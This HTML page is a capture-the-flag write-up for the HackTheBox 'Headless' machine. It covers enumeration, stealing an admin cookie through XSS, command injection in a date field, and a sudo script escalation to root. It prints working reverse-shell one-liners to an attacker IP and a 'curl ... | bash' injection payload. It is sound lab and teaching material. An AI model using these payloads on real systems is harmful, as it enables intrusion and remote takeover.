@@ -1,0 +1,209 @@
+<html>                             
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>HackTheBox: Headless</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+Headless is a super easy machine that introduces the user to basic XSS with
+cookies and some simple privilege escalation techniques that can be easily
+expanded upon and applied to other boxes.
+
+   MACHINE INFO
+┌──────────────────────────┐
+│  MACHINE NAME: <a href="https://app.hackthebox.com/machines/Headless">Headless</a>  │
+│  IP: 10.10.11.8          │
+│  DIFFICULTY: Easy        │
+└──────────────────────────┘
+
+An initial nmap of the machine already starts to give us interesting
+information about the machine. There is an http server running on port 5000
+which sets a cookie to identify the user as an admin or not, since the cookie
+seems to be a long randomised string, we probably can't just bruteforce it, but
+it's likely something to be exploited.
+
+  <bl>$ nmap -sC -sV 10.10.11.8                                
+  
+  PORT     STATE SERVICE VERSION
+  22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+  5000/tcp open  upnp?
+  | fingerprint-strings: 
+  |   GetRequest: 
+  |     HTTP/1.1 200 OK
+  |     Server: Werkzeug/2.2.2 Python/3.11.2
+  |     Date: Thu, 06 Jun 2024 02:03:33 GMT
+  |     Content-Type: text/html; charset=utf-8
+  |     Content-Length: 2799
+  |     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+  |     Connection: close</bl>
+
+Now, we can quickly see if there are any other pages, like perhaps an admin 
+dashboard, using a tool like gobuster.
+
+  $ gobuster dir -u 10.10.11.8:5000 -w common.txt
+
+  ===============================================================
+  Gobuster v3.6
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.10.11.8:5000/
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                common.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.6
+  [+] Timeout:                 10s
+  ===============================================================
+  Starting gobuster in directory enumeration mode
+  ===============================================================
+  /dashboard            <r>(Status: 500)</r> [Size: 265]
+  /support              <g>(Status: 200)</g> [Size: 2363]
+  Progress: 4727 / 4727 (100.00%)
+  ===============================================================
+  Finished
+  ===============================================================
+
+And, there is, however it returns an http 500. Accessed through a browser,
+it shows the message:
+
+  <bl>Unauthorized
+
+  The server could not verify that you are authorized to access the URL 
+  requested. You either supplied the wrong credentials (e.g. a bad password),
+  or your browser doesn't understand how to supply the credentials required.</bl>
+
+Further fuzzing through gobuster finds no other subdomains or directories, and
+the support page doesn't seem to do anything. Interestingly, if we take the
+cookie we already have and run it through CyberChef to undo a Base64 Encoding
+we can see that the first bit of the string decodes to "user", and the rest is
+gibberish.
+
+  <bl>From Base64
+  Input:
+  InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+
+  Output:
+  "user"¸ f^TïËòÍhðÖðY~</bl>
+
+The site is based on Python, but it's using Werkzeug rather than flask, which
+means we can't use flask-unsign to craft a cookie. Instead, we can try some XSS
+with burpsuite. I used the one liner I found in <a href="https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e">this article</a>, filled all my 
+http fields with it, and got a hit.
+
+  <bl>$ python3 -m http.server 8000
+  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+  10.10.11.8 - - [05/Jun/2024 20:31:40] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZ
+  y5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -</bl>
+
+We'll decode that cookie and pass it back to burpsuite as a cookie.
+
+  <bl>$ echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" 
+  | base64 -d
+  
+  is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</bl>
+
+Now, we get a page that offers to generate a website status.
+
+  <bl>Administrator Dashboard
+
+  Generate a website health report:
+  Select Date:
+  09/15/2023
+  Generate Report</bl>
+
+I suspect potential code execution through the date attribute, given the nature
+of the other vulnerability, so I try a basic reverse shell one liner, and alas,
+nothing.
+
+  <bl>date=2023-09-15;/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.16.12/8000 
+  0>&1'</bl>
+
+But, I try again, this time hosting the payload as a file, using python like we
+did previously, and I get a hit.
+
+  <bl>...
+  Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+  date=2023-09-15;curl http://10.10.16.12:8001/shell.sh|bash
+
+  $ python3 -m http.server 8001
+  Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
+  10.10.11.8 - - [05/Jun/2024 21:27:13] "GET /shell.sh HTTP/1.1" 200 -
+
+  $ nc -nvlp 1111
+  Connection from 10.10.11.8:52230
+  bash-5.2$</bl>
+
+From here, we can quickly grab the user flag.
+
+  <bl>$ cd ..
+  $ cat user.txt</bl>
+
+Now, we'll list the privileges for our current user using sudo. sudo -l allows
+us to list the programs our current user is able to run as a privileged user.
+And, surprisingly, we actually get a hit here too.
+
+  <bl>$ whoami
+  dvir
+  $ sudo -l
+  Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+  User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck</bl>
+
+The current user can invoke /usr/bin/syscheck, and we can see what that does
+with a quick cat.
+
+  <bl>$ cat /usr/bin/syscheck
+  #!/bin/bash
+
+  if [ "$EUID" -ne 0 ]; then
+    exit 1
+  fi
+
+  last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {}
+  + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+  formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+  /usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+  disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+  /usr/bin/echo "Available disk space: $disk_space"
+
+  load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+  /usr/bin/echo "System load average: $load_average"
+
+  if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+    /usr/bin/echo "Database service is not running. Starting it..."
+    ./initdb.sh 2>/dev/null
+  else
+    /usr/bin/echo "Database service is running."
+  fi
+
+  exit 0</bl>
+
+The program is a bash script that calls a bunch of other system utilities as
+well as one other script, which we happen to be able to edit. Funnily, when I
+read the file out, I found someone else's reverse shell, which is a pretty good
+sign that we're on the right track.
+
+  <bl>$ echo "/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.16.12/1112 0>&1'" > initdb.sh
+  $ sudo syscheck
+  Last Kernel Modification Time: 01/02/2024 10:05
+  Available disk space: 2.0G
+  System load average:  0.04, 0.08, 0.04
+  Database service is not running. Starting it...
+
+  $ nc -nvlp 1112
+  Connection from 10.10.11.8:35322
+  root@headless:/home/dvir# cd
+  root@headless:~# cat root.txt</bl>
+
+</pre>
+</body>
+</html>
